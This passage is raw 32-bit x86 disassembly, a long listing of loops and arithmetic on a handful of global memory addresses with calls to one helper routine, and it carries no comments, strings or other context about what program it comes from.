  42760a:	movzx  edi,di
  42760d:	sbb    eax,DWORD PTR ds:0x43e09c
  427613:	add    esi,DWORD PTR [esp+0x14]
  427617:	mov    DWORD PTR [esp+0x10],0x9b9
  42761f:	adc    eax,DWORD PTR [esp+0x18]
  427623:	sub    edi,ebp
  427625:	mov    ds:0x43e09c,eax
  42762a:	lea    eax,[esi+ebx*1+0x4]
  42762e:	add    edi,edx
  427630:	mov    ds:0x43e05c,eax
  427635:	dec    edx
  427636:	je     0x42764b
  427638:	sub    edx,0x12
  42763b:	je     0x427646
  42763d:	push   0x5c
  42763f:	pop    edx
  427640:	sub    edx,edi
  427642:	mov    edi,edx
  427644:	jmp    0x427659
  427646:	lea    edi,[ecx+0x18]
  427649:	jmp    0x427659
  42764b:	movzx  edx,di
  42764e:	sub    edx,ecx
  427650:	inc    edx
  427651:	mov    DWORD PTR ds:0x43e058,edx
  427657:	mov    ecx,edx
  427659:	lea    edx,[edi+ecx*1+0x5]
  42765d:	cmp    ecx,edx
  42765f:	jne    0x427677
  427661:	mov    edx,edi
  427663:	imul   edx,edx,0x5c
  427666:	cmp    ecx,edx
  427668:	je     0x427673
  42766a:	mov    edx,ecx
  42766c:	sub    edx,edi
  42766e:	add    edx,0x2e
  427671:	jmp    0x427677
  427673:	lea    edx,[edi+ecx*1+0x4]
  427677:	lea    ebp,[edi+edx*1+0x32]
  42767b:	cmp    ebp,ecx
  42767d:	jne    0x427683
  42767f:	lea    edx,[edi+ecx*1+0x1f]
  427683:	dec    DWORD PTR [esp+0x10]
  427687:	jne    0x427635
  427689:	xor    edx,edx
  42768b:	push   0x48
  42768d:	pop    ebp
  42768e:	div    ebp
  427690:	mov    edx,DWORD PTR ds:0x43e05c
  427696:	cmp    eax,0x65
  427699:	jbe    0x4276a5
  42769b:	lea    eax,[esi+ebx*1]
  42769e:	lea    edx,[edx+eax*1+0x3ef9]
  4276a5:	sub    edx,edi
  4276a7:	sub    edx,0x3222
  4276ad:	mov    edi,edx
  4276af:	imul   edi,edi,0x5c
  4276b2:	mov    eax,ebx
  4276b4:	sub    eax,esi
  4276b6:	add    eax,0x2e
  4276b9:	cmp    ecx,edi
  4276bb:	mov    ds:0x43e05c,eax
  4276c0:	je     0x4276cb
  4276c2:	mov    edi,ecx
  4276c4:	sub    edi,edx
  4276c6:	add    edi,0x2e
  4276c9:	jmp    0x4276cf
  4276cb:	lea    edi,[edx+ecx*1+0x4]
  4276cf:	mov    ebp,eax
  4276d1:	dec    ebp
  4276d2:	mov    DWORD PTR ds:0x43e094,edi
  4276d8:	je     0x42771c
  4276da:	sub    ebp,0x12
  4276dd:	je     0x427710
  4276df:	xor    edi,edi
  4276e1:	add    eax,0x2e
  4276e4:	xor    ebp,ebp
  4276e6:	sub    eax,DWORD PTR ds:0x43e05c
  4276ec:	sbb    edi,ebp
  4276ee:	sub    eax,esi
  4276f0:	sbb    edi,DWORD PTR ds:0x43e09c
  4276f6:	add    eax,0x2e
  4276f9:	adc    edi,ebp
  4276fb:	mov    esi,eax
  4276fd:	mov    eax,ds:0x43e05c
  427702:	mov    DWORD PTR ds:0x43e09c,edi
  427708:	mov    edi,DWORD PTR ds:0x43e094
  42770e:	jmp    0x427728
  427710:	and    DWORD PTR ds:0x43e09c,0x0
  427717:	lea    esi,[ebx+0x18]
  42771a:	jmp    0x427728
  42771c:	movzx  eax,si
  42771f:	sub    eax,ebx
  427721:	inc    eax
  427722:	mov    ebx,eax
  427724:	lea    eax,[esi+ebx*1+0x1f]
  427728:	add    eax,edx
  42772a:	lea    eax,[edi+eax*1+0x3ef9]
  427731:	mov    ds:0x43e094,eax
  427736:	lea    edi,[esi+ebx*1+0x4]
  42773a:	mov    DWORD PTR [esp+0x10],0x3c
  427742:	cmp    ecx,edx
  427744:	je     0x42777d
  427746:	lea    eax,[edx+ecx*1+0x5]
  42774a:	cmp    eax,0x39b
  42774f:	mov    ds:0x43e094,eax
  427754:	je     0x42777d
  427756:	lea    ebp,[edx+eax*1+0x32]
  42775a:	cmp    ebp,ecx
  42775c:	jne    0x427767
  42775e:	lea    eax,[edx+ecx*1+0x1f]
  427762:	mov    ds:0x43e094,eax
  427767:	add    DWORD PTR [esp+0x10],0x5
  42776c:	cmp    DWORD PTR [esp+0x10],0xc4f
  427774:	movzx  edx,cl
  427777:	lea    edx,[edx+eax*1+0x4]
  42777b:	jl     0x427742
  42777d:	mov    DWORD PTR [esp+0x10],0x3c
  427785:	jmp    0x42778c
  427787:	mov    eax,ds:0x43e094
  42778c:	cmp    ebx,esi
  42778e:	jne    0x42779f
  427790:	xor    eax,eax
  427792:	cmp    eax,DWORD PTR ds:0x43e09c
  427798:	je     0x4277f0
  42779a:	mov    eax,ds:0x43e094
  42779f:	lea    edi,[esi+ebx*1+0x5]
  4277a3:	cmp    edi,0x39b
  4277a9:	je     0x4277f5
  4277ab:	xor    eax,eax
  4277ad:	mov    DWORD PTR [esp+0x1c],edi
  4277b1:	add    DWORD PTR [esp+0x1c],esi
  4277b5:	mov    ebp,DWORD PTR [esp+0x1c]
  4277b9:	adc    eax,DWORD PTR ds:0x43e09c
  4277bf:	add    ebp,0x32
  4277c2:	adc    eax,0x0
  4277c5:	cmp    ebp,ebx
  4277c7:	jne    0x4277d3
  4277c9:	xor    ebp,ebp
  4277cb:	cmp    eax,ebp
  4277cd:	jne    0x4277d3
  4277cf:	lea    edi,[esi+ebx*1+0x1f]
  4277d3:	add    DWORD PTR [esp+0x10],0x5
  4277d8:	and    DWORD PTR ds:0x43e09c,0x0
  4277df:	cmp    DWORD PTR [esp+0x10],0xc4f
  4277e7:	movzx  eax,bl
  4277ea:	lea    esi,[eax+edi*1+0x4]
  4277ee:	jl     0x427787
  4277f0:	mov    eax,ds:0x43e094
  4277f5:	movzx  esi,di
  4277f8:	sub    esi,edx
  4277fa:	add    esi,eax
  4277fc:	movzx  eax,bl
  4277ff:	lea    eax,[eax+edi*1+0x4]
  427803:	mov    ds:0x43e098,eax
  427808:	push   0x48
  42780a:	xor    edx,edx
  42780c:	pop    ebp
  42780d:	mov    eax,edi
  42780f:	div    ebp
  427811:	mov    ebp,DWORD PTR ds:0x43e098
  427817:	cmp    eax,0x65
  42781a:	jbe    0x427826
  42781c:	lea    eax,[ebx+ebp*1]
  42781f:	lea    edi,[edi+eax*1+0x3ef9]
  427826:	sub    edi,esi
  427828:	add    edi,0x2e
  42782b:	lea    edx,[ecx+edi*1-0x32]
  42782f:	cmp    edx,0x23e
  427835:	lea    eax,[ebx+ebp*1+0x5]
  427839:	jb     0x427842
  42783b:	mov    esi,ecx
  42783d:	sub    esi,edi
  42783f:	add    esi,0x2e
  427842:	sub    eax,esi
  427844:	lea    edx,[ebx+ebp*1+0x4]
  427848:	add    eax,0x2e
  42784b:	mov    DWORD PTR ds:0x43e05c,edx
  427851:	lea    edx,[esi+eax*1+0x32]
  427855:	cmp    edx,ecx
  427857:	jne    0x42785d
  427859:	lea    eax,[esi+ecx*1+0x1f]
  42785d:	mov    DWORD PTR [esp+0x10],0x3c
  427865:	cmp    ebx,ebp
  427867:	jne    0x427871
  427869:	xor    edx,edx
  42786b:	xor    esi,esi
  42786d:	cmp    esi,edx
  42786f:	je     0x4278c5
  427871:	lea    edx,[ebx+ebp*1+0x5]
  427875:	cmp    edx,0x39b
  42787b:	mov    DWORD PTR ds:0x43e05c,edx
  427881:	je     0x4278c5
  427883:	xor    esi,esi
  427885:	mov    DWORD PTR [esp+0x1c],edx
  427889:	add    DWORD PTR [esp+0x1c],ebp
  42788d:	push   esi
  42788e:	pop    edi
  42788f:	adc    esi,edi
  427891:	mov    edi,DWORD PTR [esp+0x1c]
  427895:	add    edi,0x32
  427898:	adc    esi,0x0
  42789b:	cmp    edi,ebx
  42789d:	jne    0x4278af
  42789f:	xor    edi,edi
  4278a1:	cmp    esi,edi
  4278a3:	jne    0x4278af
  4278a5:	lea    edx,[ebx+ebp*1+0x1f]
  4278a9:	mov    DWORD PTR ds:0x43e05c,edx
  4278af:	add    DWORD PTR [esp+0x10],0x5
  4278b4:	cmp    DWORD PTR [esp+0x10],0xc4f
  4278bc:	movzx  ebp,bl
  4278bf:	lea    ebp,[edx+ebp*1+0x4]
  4278c3:	jl     0x427865
  4278c5:	movzx  edx,BYTE PTR ds:0x43e05c
  4278cc:	lea    esi,[edx+eax*1-0xe]
  4278d0:	movzx  eax,bx
  4278d3:	cdq    
  4278d4:	mov    DWORD PTR [esp+0x18],edx
  4278d8:	xor    edx,edx
  4278da:	mov    DWORD PTR [esp+0x14],eax
  4278de:	mov    eax,ds:0x43e05c
  4278e3:	push   edx
  4278e4:	mov    edi,eax
  4278e6:	sub    edi,ebp
  4278e8:	pop    ebp
  4278e9:	sbb    edx,ebp
  4278eb:	add    edi,DWORD PTR [esp+0x14]
  4278ef:	push   0x48
  4278f1:	adc    edx,DWORD PTR [esp+0x1c]
  4278f5:	pop    ebp
  4278f6:	mov    DWORD PTR ds:0x43e09c,edx
  4278fc:	xor    edx,edx
  4278fe:	div    ebp
  427900:	cmp    eax,0x65
  427903:	jbe    0x42791a
  427905:	mov    edx,DWORD PTR ds:0x43e05c
  42790b:	lea    eax,[edi+ebx*1]
  42790e:	lea    eax,[edx+eax*1+0x3ef9]
  427915:	mov    ds:0x43e05c,eax
  42791a:	mov    eax,ds:0x43e05c
  42791f:	lea    edx,[ebx-0x3222]
  427925:	xor    ebp,ebp
  427927:	sub    edx,edi
  427929:	sbb    ebp,DWORD PTR ds:0x43e09c
  42792f:	mov    DWORD PTR ds:0x43e098,edx
  427935:	lea    eax,[eax+esi*1+0x4]
  427939:	mov    DWORD PTR ds:0x43e09c,ebp
  42793f:	mov    edx,0x9b9
  427944:	dec    eax
  427945:	je     0x42795a
  427947:	sub    eax,0x12
  42794a:	je     0x427955
  42794c:	push   0x5c
  42794e:	pop    eax
  42794f:	sub    eax,esi
  427951:	mov    esi,eax
  427953:	jmp    0x427967
  427955:	lea    esi,[ecx+0x18]
  427958:	jmp    0x427967
  42795a:	movzx  eax,si
  42795d:	sub    eax,ecx
  42795f:	inc    eax
  427960:	mov    ds:0x43e058,eax
  427965:	mov    ecx,eax
  427967:	lea    eax,[esi+ecx*1+0x5]
  42796b:	cmp    ecx,eax
  42796d:	jne    0x427985
  42796f:	mov    eax,esi
  427971:	imul   eax,eax,0x5c
  427974:	cmp    ecx,eax
  427976:	je     0x427981
  427978:	mov    eax,ecx
  42797a:	sub    eax,esi
  42797c:	add    eax,0x2e
  42797f:	jmp    0x427985
  427981:	lea    eax,[esi+ecx*1+0x4]
  427985:	lea    edi,[esi+eax*1+0x32]
  427989:	cmp    edi,ecx
  42798b:	jne    0x427991
  42798d:	lea    eax,[esi+ecx*1+0x1f]
  427991:	dec    edx
  427992:	jne    0x427944
  427994:	mov    eax,ds:0x43e05c
  427999:	mov    dl,BYTE PTR ds:0x43e098
  42799f:	add    dl,al
  4279a1:	add    dl,bl
  4279a3:	lea    esi,[eax+esi*1+0x1f]
  4279a7:	sub    dl,0x7
  4279aa:	movzx  eax,dl
  4279ad:	mov    edi,ebx
  4279af:	sub    edi,DWORD PTR ds:0x43e098
  4279b5:	lea    ebp,[eax+esi*1+0x4]
  4279b9:	add    edi,0x2e
  4279bc:	mov    eax,esi
  4279be:	dec    eax
  4279bf:	mov    DWORD PTR ds:0x43e05c,edi
  4279c5:	jne    0x4279d8
  4279c7:	movzx  eax,bp
  4279ca:	sub    eax,ecx
  4279cc:	inc    eax
  4279cd:	mov    ds:0x43e058,eax
  4279d2:	lea    esi,[eax+ebp*1+0x1f]
  4279d6:	mov    ecx,eax
  4279d8:	mov    eax,ds:0x43e05c
  4279dd:	push   0x48
  4279df:	xor    edx,edx
  4279e1:	pop    edi
  4279e2:	div    edi
  4279e4:	mov    edi,DWORD PTR ds:0x43e098
  4279ea:	cmp    eax,0x65
  4279ed:	jbe    0x427a01
  4279ef:	mov    edx,DWORD PTR ds:0x43e05c
  4279f5:	lea    eax,[edi+ebx*1]
  4279f8:	lea    eax,[edx+eax*1+0x3ef9]
  4279ff:	jmp    0x427a06
  427a01:	mov    al,ds:0x43e05c
  427a06:	movzx  eax,al
  427a09:	lea    esi,[eax+esi*1+0x4]
  427a0d:	mov    eax,esi
  427a0f:	sub    eax,edi
  427a11:	lea    eax,[eax+ebx*1+0x33]
  427a15:	lea    ebp,[ecx+eax*1-0x32]
  427a19:	cmp    ebp,0x23e
  427a1f:	lea    edx,[edi+ebx*1+0x4]
  427a23:	jb     0x427a2c
  427a25:	mov    esi,ecx
  427a27:	sub    esi,eax
  427a29:	add    esi,0x2e
  427a2c:	mov    DWORD PTR [esp+0x10],0x3c
  427a34:	cmp    ebx,edi
  427a36:	jne    0x427a42
  427a38:	xor    eax,eax
  427a3a:	cmp    eax,DWORD PTR ds:0x43e09c
  427a40:	je     0x427a93
  427a42:	lea    edx,[edi+ebx*1+0x5]
  427a46:	cmp    edx,0x39b
  427a4c:	je     0x427a93
  427a4e:	xor    eax,eax
  427a50:	mov    DWORD PTR [esp+0x1c],edx
  427a54:	add    DWORD PTR [esp+0x1c],edi
  427a58:	mov    ebp,DWORD PTR [esp+0x1c]
  427a5c:	adc    eax,DWORD PTR ds:0x43e09c
  427a62:	add    ebp,0x32
  427a65:	adc    eax,0x0
  427a68:	cmp    ebp,ebx
  427a6a:	jne    0x427a76
  427a6c:	xor    ebp,ebp
  427a6e:	cmp    eax,ebp
  427a70:	jne    0x427a76
  427a72:	lea    edx,[edi+ebx*1+0x1f]
  427a76:	add    DWORD PTR [esp+0x10],0x5
  427a7b:	and    DWORD PTR ds:0x43e09c,0x0
  427a82:	cmp    DWORD PTR [esp+0x10],0xc4f
  427a8a:	movzx  edi,bl
  427a8d:	lea    edi,[edi+edx*1+0x4]
  427a91:	jl     0x427a34
  427a93:	and    DWORD PTR ds:0x43e09c,0x0
  427a9a:	movzx  eax,bl
  427a9d:	xor    edi,edi
  427a9f:	lea    eax,[eax+edx*1-0xe]
  427aa3:	mov    DWORD PTR [esp+0x1c],edx
  427aa7:	add    DWORD PTR [esp+0x1c],eax
  427aab:	mov    ebp,DWORD PTR [esp+0x1c]
  427aaf:	adc    edi,DWORD PTR ds:0x43e09c
  427ab5:	add    ebp,0x32
  427ab8:	adc    edi,0x0
  427abb:	cmp    ebp,ebx
  427abd:	jne    0x427ac9
  427abf:	xor    ebp,ebp
  427ac1:	cmp    edi,ebp
  427ac3:	jne    0x427ac9
  427ac5:	lea    edx,[eax+ebx*1+0x1f]
  427ac9:	mov    ebp,edx
  427acb:	sub    ebp,esi
  427acd:	lea    esi,[eax+ebx*1]
  427ad0:	lea    edx,[edx+esi*1+0x3ef9]
  427ad7:	sub    ebp,0x3222
  427add:	lea    esi,[edx+ebx*1-0x32]
  427ae1:	mov    edi,0x23e
  427ae6:	cmp    esi,edi
  427ae8:	mov    DWORD PTR ds:0x43e07c,ebp
  427aee:	jb     0x427afe
  427af0:	mov    eax,ebx
  427af2:	sub    eax,edx
  427af4:	add    eax,0x2e
  427af7:	and    DWORD PTR ds:0x43e09c,0x0
  427afe:	mov    esi,ebx
  427b00:	sub    esi,eax
  427b02:	add    esi,0x2e
  427b05:	lea    edx,[esi+ebx*1-0x32]
  427b09:	cmp    edx,edi
  427b0b:	jb     0x427b1b
  427b0d:	mov    eax,ebx
  427b0f:	sub    eax,esi
  427b11:	add    eax,0x2e
  427b14:	and    DWORD PTR ds:0x43e09c,0x0
  427b1b:	xor    edi,edi
  427b1d:	sub    esi,eax
  427b1f:	sbb    edi,DWORD PTR ds:0x43e09c
  427b25:	add    esi,DWORD PTR [esp+0x14]
  427b29:	mov    DWORD PTR [esp+0x10],0x9b9
  427b31:	adc    edi,DWORD PTR [esp+0x18]
  427b35:	lea    eax,[esi+ebx*1+0x5]
  427b39:	mov    DWORD PTR ds:0x43e09c,edi
  427b3f:	mov    edx,eax
  427b41:	dec    edx
  427b42:	je     0x427b7c
  427b44:	xor    edi,edi
  427b46:	sub    edx,0x12
  427b49:	je     0x427b71
  427b4b:	xor    ebp,ebp
  427b4d:	lea    edx,[eax+0x2e]
  427b50:	sub    edx,eax
  427b52:	sbb    edi,ebp
  427b54:	sub    edx,esi
  427b56:	sbb    edi,DWORD PTR ds:0x43e09c
  427b5c:	add    edx,0x2e
  427b5f:	adc    edi,ebp
  427b61:	mov    ebp,DWORD PTR ds:0x43e07c
  427b67:	mov    esi,edx
  427b69:	mov    DWORD PTR ds:0x43e09c,edi
  427b6f:	jmp    0x427b84
  427b71:	lea    esi,[ebx+0x18]
  427b74:	mov    DWORD PTR ds:0x43e09c,edi
  427b7a:	jmp    0x427b84
  427b7c:	movzx  eax,si
  427b7f:	sub    eax,ebx
  427b81:	inc    eax
  427b82:	mov    ebx,eax
  427b84:	lea    eax,[esi+ebx*1+0x5]
  427b88:	cmp    ebx,eax
  427b8a:	jne    0x427bb4
  427b8c:	push   0x0
  427b8e:	push   0x5c
  427b90:	push   edi
  427b91:	push   esi
  427b92:	call   0x437b80
  427b97:	xor    ecx,ecx
  427b99:	cmp    ebx,eax
  427b9b:	jne    0x427ba1
  427b9d:	cmp    ecx,edx
  427b9f:	je     0x427baa
  427ba1:	mov    eax,ebx
  427ba3:	sub    eax,esi
  427ba5:	add    eax,0x2e
  427ba8:	jmp    0x427bae
  427baa:	lea    eax,[esi+ebx*1+0x4]
  427bae:	mov    ecx,DWORD PTR ds:0x43e058
  427bb4:	and    DWORD PTR [esp+0x20],0x0
  427bb9:	mov    DWORD PTR [esp+0x1c],eax
  427bbd:	add    DWORD PTR [esp+0x1c],esi
  427bc1:	mov    edx,DWORD PTR [esp+0x1c]
  427bc5:	adc    DWORD PTR [esp+0x20],edi
  427bc9:	add    edx,0x32
  427bcc:	mov    DWORD PTR [esp+0x24],edx
  427bd0:	mov    edx,DWORD PTR [esp+0x20]
  427bd4:	adc    edx,0x0
  427bd7:	cmp    DWORD PTR [esp+0x24],ebx
  427bdb:	mov    DWORD PTR [esp+0x28],edx
  427bdf:	jne    0x427bf3
  427be1:	mov    ebp,DWORD PTR ds:0x43e07c
  427be7:	xor    edx,edx
  427be9:	cmp    DWORD PTR [esp+0x28],edx
  427bed:	jne    0x427bf3
  427bef:	lea    eax,[esi+ebx*1+0x1f]
  427bf3:	dec    DWORD PTR [esp+0x10]
  427bf7:	jne    0x427b3f
  427bfd:	mov    DWORD PTR [esp+0x10],0x3c
  427c05:	cmp    ecx,ebp
  427c07:	je     0x427c3c
  427c09:	lea    eax,[ecx+ebp*1+0x5]
  427c0d:	cmp    eax,0x39b
  427c12:	je     0x427c3c
  427c14:	lea    edx,[eax+ebp*1+0x32]
  427c18:	cmp    edx,ecx
  427c1a:	jne    0x427c20
  427c1c:	lea    eax,[ecx+ebp*1+0x1f]
  427c20:	add    DWORD PTR [esp+0x10],0x5
  427c25:	cmp    DWORD PTR [esp+0x10],0xc4f
  427c2d:	movzx  edx,cl
  427c30:	lea    ebp,[edx+eax*1+0x4]
  427c34:	mov    DWORD PTR ds:0x43e07c,ebp
  427c3a:	jl     0x427c05
  427c3c:	lea    eax,[esi+ebx*1+0x4]
  427c40:	mov    DWORD PTR [esp+0x10],0x9b9
  427c48:	mov    edx,eax
  427c4a:	dec    edx
  427c4b:	je     0x427c85
  427c4d:	xor    edi,edi
  427c4f:	sub    edx,0x12
  427c52:	je     0x427c7a
  427c54:	xor    ebp,ebp
  427c56:	lea    edx,[eax+0x2e]
  427c59:	sub    edx,eax
  427c5b:	sbb    edi,ebp
  427c5d:	sub    edx,esi
  427c5f:	sbb    edi,DWORD PTR ds:0x43e09c
  427c65:	add    edx,0x2e
  427c68:	adc    edi,ebp
  427c6a:	mov    ebp,DWORD PTR ds:0x43e07c
  427c70:	mov    esi,edx
  427c72:	mov    DWORD PTR ds:0x43e09c,edi
  427c78:	jmp    0x427c8d
  427c7a:	lea    esi,[ebx+0x18]
  427c7d:	mov    DWORD PTR ds:0x43e09c,edi
  427c83:	jmp    0x427c8d
  427c85:	movzx  eax,si
  427c88:	sub    eax,ebx
  427c8a:	inc    eax
  427c8b:	mov    ebx,eax
  427c8d:	lea    eax,[esi+ebx*1+0x5]
  427c91:	cmp    ebx,eax
  427c93:	jne    0x427cbd
  427c95:	push   0x0
  427c97:	push   0x5c
  427c99:	push   edi
  427c9a:	push   esi
  427c9b:	call   0x437b80
  427ca0:	xor    ecx,ecx
  427ca2:	cmp    ebx,eax
  427ca4:	jne    0x427caa
  427ca6:	cmp    ecx,edx
  427ca8:	je     0x427cb3
  427caa:	mov    eax,ebx
  427cac:	sub    eax,esi
  427cae:	add    eax,0x2e
  427cb1:	jmp    0x427cb7
  427cb3:	lea    eax,[esi+ebx*1+0x4]
  427cb7:	mov    ecx,DWORD PTR ds:0x43e058
  427cbd:	and    DWORD PTR [esp+0x20],0x0
  427cc2:	mov    DWORD PTR [esp+0x1c],eax
  427cc6:	add    DWORD PTR [esp+0x1c],esi
  427cca:	mov    edx,DWORD PTR [esp+0x1c]
  427cce:	adc    DWORD PTR [esp+0x20],edi
  427cd2:	add    edx,0x32
  427cd5:	mov    DWORD PTR [esp+0x24],edx
  427cd9:	mov    edx,DWORD PTR [esp+0x20]
  427cdd:	adc    edx,0x0
  427ce0:	cmp    DWORD PTR [esp+0x24],ebx
  427ce4:	mov    DWORD PTR [esp+0x28],edx
  427ce8:	jne    0x427cfc
  427cea:	mov    ebp,DWORD PTR ds:0x43e07c
  427cf0:	xor    edx,edx
  427cf2:	cmp    DWORD PTR [esp+0x28],edx
  427cf6:	jne    0x427cfc
  427cf8:	lea    eax,[esi+ebx*1+0x1f]
  427cfc:	dec    DWORD PTR [esp+0x10]
  427d00:	jne    0x427c48
  427d06:	sub    eax,ebp
  427d08:	mov    edx,ebx
  427d0a:	sub    edx,esi
  427d0c:	add    eax,0x2e
  427d0f:	add    edx,0x2e
  427d12:	mov    DWORD PTR [esp+0x10],0x3c
  427d1a:	cmp    ecx,ebp
  427d1c:	je     0x427d60
  427d1e:	lea    eax,[ecx+ebp*1+0x5]
  427d22:	cmp    eax,0x39b
  427d27:	mov    ds:0x43e094,eax
  427d2c:	je     0x427d60
  427d2e:	lea    eax,[eax+ebp*1+0x32]
  427d32:	cmp    eax,ecx
  427d34:	jne    0x427d3f
  427d36:	lea    eax,[ecx+ebp*1+0x1f]
  427d3a:	mov    ds:0x43e094,eax
  427d3f:	mov    ebp,DWORD PTR ds:0x43e094
  427d45:	add    DWORD PTR [esp+0x10],0x5
  427d4a:	cmp    DWORD PTR [esp+0x10],0xc4f
  427d52:	movzx  eax,cl
  427d55:	lea    ebp,[eax+ebp*1+0x4]
  427d59:	mov    eax,ds:0x43e094
  427d5e:	jl     0x427d1a
  427d60:	mov    DWORD PTR [esp+0x10],0x3c
  427d68:	cmp    ebx,esi
  427d6a:	jne    0x427d72
  427d6c:	xor    ecx,ecx
  427d6e:	cmp    ecx,edi
  427d70:	je     0x427db2
  427d72:	lea    edx,[esi+ebx*1+0x5]
  427d76:	cmp    edx,0x39b
  427d7c:	je     0x427db2
  427d7e:	xor    ebp,ebp
  427d80:	mov    ecx,edx
  427d82:	add    ecx,esi
  427d84:	adc    ebp,edi
  427d86:	add    ecx,0x32
  427d89:	adc    ebp,0x0
  427d8c:	cmp    ecx,ebx
  427d8e:	jne    0x427d9a
  427d90:	xor    ecx,ecx
  427d92:	cmp    ebp,ecx
  427d94:	jne    0x427d9a
  427d96:	lea    edx,[esi+ebx*1+0x1f]
  427d9a:	add    DWORD PTR [esp+0x10],0x5
  427d9f:	movzx  ecx,bl
  427da2:	xor    edi,edi
  427da4:	cmp    DWORD PTR [esp+0x10],0xc4f
  427dac:	lea    esi,[ecx+edx*1+0x4]
  427db0:	jl     0x427d68
  427db2:	movzx  ecx,dl
  427db5:	lea    eax,[ecx+eax*1+0x4]
  427db9:	push   0x3c
  427dbb:	mov    ds:0x43e07c,eax
  427dc0:	lea    ecx,[esi+ebx*1+0x1f]
  427dc4:	pop    ebp
  427dc5:	cmp    ebx,esi
  427dc7:	jne    0x427dcf
  427dc9:	xor    eax,eax
  427dcb:	cmp    eax,edi
  427dcd:	je     0x427e0b
  427dcf:	lea    ecx,[esi+ebx*1+0x5]
  427dd3:	cmp    ecx,0x39b
  427dd9:	je     0x427e0b
  427ddb:	xor    edx,edx
  427ddd:	mov    eax,ecx
  427ddf:	add    eax,esi
  427de1:	adc    edx,edi
  427de3:	push   0x0
  427de5:	add    eax,0x32
  427de8:	pop    edi
  427de9:	adc    edx,edi
  427deb:	cmp    eax,ebx
  427ded:	jne    0x427df9
  427def:	xor    eax,eax
  427df1:	cmp    edx,eax
  427df3:	jne    0x427df9
  427df5:	lea    ecx,[esi+ebx*1+0x1f]
  427df9:	movzx  eax,bl
  427dfc:	add    ebp,0x5
  427dff:	cmp    ebp,0xc4f
  427e05:	lea    esi,[eax+ecx*1+0x4]
  427e09:	jl     0x427dc5
  427e0b:	xor    eax,eax
  427e0d:	lea    ebp,[ebx-0x3222]
  427e13:	sub    ebp,esi
  427e15:	sbb    eax,edi
  427e17:	mov    ds:0x43e09c,eax
  427e1c:	movzx  eax,bx
  427e1f:	cdq    
  427e20:	mov    DWORD PTR [esp+0x14],eax
  427e24:	xor    eax,eax
  427e26:	sub    ecx,ebp
  427e28:	sbb    eax,DWORD PTR ds:0x43e09c
  427e2e:	add    ecx,DWORD PTR [esp+0x14]
  427e32:	push   0x0
  427e34:	push   0x5c
  427e36:	adc    eax,edx
  427e38:	mov    esi,ecx
  427e3a:	push   eax
  427e3b:	push   esi
  427e3c:	mov    DWORD PTR [esp+0x28],edx
  427e40:	call   0x437b80
  427e45:	cmp    ebx,eax
  427e47:	jne    0x427e4f
  427e49:	xor    eax,eax
  427e4b:	cmp    eax,edx
  427e4d:	je     0x427e58
  427e4f:	mov    ecx,ebx
  427e51:	sub    ecx,esi
  427e53:	add    ecx,0x2e
  427e56:	jmp    0x427e5c
  427e58:	lea    ecx,[esi+ebx*1+0x4]
  427e5c:	movzx  ebp,bl
  427e5f:	lea    eax,[ecx+ebx*1-0x32]
  427e63:	xor    edi,edi
  427e65:	cmp    eax,0x23e
  427e6a:	lea    esi,[ecx+ebp*1-0xe]
  427e6e:	jb     0x427e77
  427e70:	mov    esi,ebx
  427e72:	sub    esi,ecx
  427e74:	add    esi,0x2e
  427e77:	xor    edx,edx
  427e79:	mov    eax,ecx
  427e7b:	sub    eax,esi
  427e7d:	sbb    edx,edi
  427e7f:	add    eax,DWORD PTR [esp+0x14]
  427e83:	mov    DWORD PTR [esp+0x10],0x3c
  427e8b:	adc    edx,DWORD PTR [esp+0x18]
  427e8f:	lea    esi,[eax+ebx*1]
  427e92:	lea    ecx,[ecx+esi*1+0x3ef9]
  427e99:	mov    ds:0x43e098,eax
  427e9e:	mov    DWORD PTR ds:0x43e09c,edx
  427ea4:	mov    DWORD PTR ds:0x43e05c,ecx
  427eaa:	cmp    ebx,eax
  427eac:	jne    0x427eb4
  427eae:	xor    esi,esi
  427eb0:	cmp    esi,edx
  427eb2:	je     0x427f08
  427eb4:	lea    ecx,[eax+ebx*1+0x5]
  427eb8:	cmp    ecx,0x39b
  427ebe:	mov    DWORD PTR ds:0x43e05c,ecx
  427ec4:	je     0x427f08
  427ec6:	xor    edi,edi
  427ec8:	mov    esi,ecx
  427eca:	add    esi,eax
  427ecc:	adc    edi,edx
  427ece:	add    esi,0x32
  427ed1:	adc    edi,0x0
  427ed4:	cmp    esi,ebx
  427ed6:	jne    0x427ee8
  427ed8:	xor    edx,edx
  427eda:	cmp    edi,edx
  427edc:	jne    0x427ee8
  427ede:	lea    ecx,[eax+ebx*1+0x1f]
  427ee2:	mov    DWORD PTR ds:0x43e05c,ecx
  427ee8:	add    DWORD PTR [esp+0x10],0x5
  427eed:	xor    edx,edx
  427eef:	cmp    DWORD PTR [esp+0x10],0xc4f
  427ef7:	lea    eax,[ecx+ebp*1+0x4]
  427efb:	mov    ds:0x43e098,eax
  427f00:	mov    DWORD PTR ds:0x43e09c,edx
  427f06:	jl     0x427eaa
  427f08:	mov    eax,ds:0x43e07c
  427f0d:	pop    edi
  427f0e:	pop    esi
  427f0f:	lea    eax,[ecx+eax*1+0x5]
  427f13:	pop    ebp
  427f14:	mov    ds:0x43e094,eax
  427f19:	pop    ebx
  427f1a:	add    esp,0x1c
  427f1d:	ret    
  427f1e:	mov    edx,DWORD PTR ds:0x43e07c
  427f24:	sub    esp,0x18
  427f27:	and    DWORD PTR ds:0x43e09c,0x0
  427f2e:	push   ebx
  427f2f:	push   ebp
  427f30:	mov    ebx,eax
  427f32:	mov    eax,ds:0x43e05c
  427f37:	push   esi
  427f38:	push   edi
  427f39:	mov    edi,DWORD PTR ds:0x43e094
  427f3f:	movzx  ecx,bl
  427f42:	lea    ebp,[ecx+eax*1-0xe]
  427f46:	push   0x3c
  427f48:	mov    DWORD PTR ds:0x43e098,ebp
  427f4e:	pop    esi
  427f4f:	mov    ecx,DWORD PTR ds:0x43e058
  427f55:	cmp    ecx,edx
  427f57:	je     0x427f89
  427f59:	lea    edi,[edx+ecx*1+0x5]
  427f5d:	cmp    edi,0x39b
  427f63:	je     0x427f89
  427f65:	lea    ebp,[edi+edx*1+0x32]
  427f69:	cmp    ebp,ecx
  427f6b:	jne    0x427f71
  427f6d:	lea    edi,[edx+ecx*1+0x1f]
  427f71:	mov    ebp,DWORD PTR ds:0x43e098
  427f77:	movzx  edx,cl
  427f7a:	add    esi,0x5
  427f7d:	cmp    esi,0xc4f
  427f83:	lea    edx,[edx+edi*1+0x4]
  427f87:	jl     0x427f4f
  427f89:	movzx  eax,ax
  427f8c:	sub    eax,edx
  427f8e:	push   0x3c
  427f90:	add    eax,edi
  427f92:	pop    edx
